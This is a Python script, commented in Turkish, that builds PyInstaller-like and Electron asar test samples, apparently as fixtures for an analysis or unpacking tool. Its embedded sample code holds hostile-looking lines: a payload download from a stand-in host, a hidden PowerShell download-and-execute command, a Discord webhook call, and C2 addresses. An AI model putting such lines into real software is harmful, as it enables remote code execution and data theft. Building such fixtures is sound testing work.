# PyInstaller benzeri CArchive (PE/ELF govdeli) ve Electron asar test ornekleri uretir (zararsiz: yalnizca metinler yapay).
# Kullanim: build_pack.py <ornek_dizini>  (pe_chk.exe ve elf_hello ayni dizinde olmali)
import sys, os, zlib, marshal, struct, json
S = sys.argv[1]; out = os.path.join(S, 'pack'); os.makedirs(out, exist_ok=True)
MAGIC = b'MEI\x0c\x0b\x0a\x0b\x0e'; PYMAGIC = bytes([0x6f, 0x0d, 0x0d, 0x0a])
def build(stub, dest, pyver=310, encrypt_pyz=False, pyarmor=False):
    main = marshal.dumps(compile("import urllib.request\nurllib.request.urlretrieve('http://evil.example.test/payload.exe','x.exe')\nHOOK='https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz0123456789ABCD'\n", 'main.py', 'exec'))
    helper = marshal.dumps(compile("print('helper module ok ok ok')\nC2='198.51.100.77'\n", 'helper.py', 'exec'))
    libm = marshal.dumps(compile("x = 1\n", 'decoder.py', 'exec'))
    pz = bytearray(b'PYZ\0' + PYMAGIC + b'\0\0\0\0'); toc = []
    mods = [('helper', helper, 0), ('json.decoder', libm, 0)] + ([('pytransform', libm, 0)] if pyarmor else [])
    for nm, b, pk in mods:
        z = zlib.compress(b)
        if encrypt_pyz: z = bytes(x ^ 0x5a for x in z)
        toc.append((nm, (pk, len(pz), len(z)))); pz += z
    tocoff = len(pz); pz += marshal.dumps(toc); pz[8:12] = struct.pack('>I', tocoff)
    data = bytearray(); ents = []
    def add(name, typ, blob, comp):
        pos = len(data); c = zlib.compress(blob) if comp else blob; data.extend(c); ents.append((name, typ, pos, len(c), len(blob), 1 if comp else 0))
    add('main', 's', main, True); add('PYZ-00.pyz', 'z', bytes(pz), False); add('config.json', 'x', b'{"server": "http://203.0.113.9/c2"}', True)
    tocbytes = b''
    for name, typ, pos, csz, usz, fl in ents:
        nb = name.encode() + b'\0'; el = 18 + len(nb); el += (-el) % 16; tocbytes += struct.pack('!iIIIBc', el, pos, csz, usz, fl, typ.encode()) + nb + b'\0' * (el - 18 - len(nb))
    toc_pos = len(data); data.extend(tocbytes)
    cookie_len = 88; pkglen = len(data) + cookie_len
    cookie = MAGIC + struct.pack('!iiii', pkglen, toc_pos, len(tocbytes), pyver) + b'libpython3.10.so'.ljust(64, b'\0')
    open(dest, 'wb').write(open(stub, 'rb').read() + bytes(data) + cookie)
build(os.path.join(S, 'pe_chk.exe'), os.path.join(out, 'pyi_app.exe'))
build(os.path.join(S, 'elf_hello'), os.path.join(out, 'pyi_app_elf'))
build(os.path.join(S, 'pe_chk.exe'), os.path.join(out, 'pyi_enc.exe'), encrypt_pyz=True)
build(os.path.join(S, 'pe_chk.exe'), os.path.join(out, 'pyi_armor.exe'), pyarmor=True)
# asar
def asar(dest, files):
    off = 0; tree = {}; body = b''
    for p, content in files.items():
        node = tree; parts = p.split('/')
        for d in parts[:-1]: node = node.setdefault(d, {'files': {}})['files']
        node[parts[-1]] = {'size': len(content), 'offset': str(off)}; body += content; off += len(content)
    js = json.dumps({'files': tree}, separators=(',', ':')).encode(); pad = (-len(js)) % 4
    payload = struct.pack('<I', len(js)) + js + b'\0' * pad
    hdr = struct.pack('<I', len(payload)) + payload
    open(dest, 'wb').write(struct.pack('<I', 4) + struct.pack('<I', len(hdr)) + hdr + body)
asar(os.path.join(out, 'app.asar'), {
    'package.json': json.dumps({'name': 'demo', 'main': 'main.js'}).encode(),
    'main.js': b"const {app}=require('electron'); const cp=require('child_process'); cp.exec('powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString(\"http://evil.example.test/s.ps1\")'); fetch('https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz0123456789ABCD');\n",
    'src/util.js': b"module.exports = function add(a, b) { return a + b; };\n",
    'node_modules/dep/index.js': b"module.exports = 1;\n"})
asar(os.path.join(out, 'clean.asar'), {'package.json': b'{"name":"ok","main":"i.js"}', 'i.js': b"console.log('hello');\n"})
print('ok')
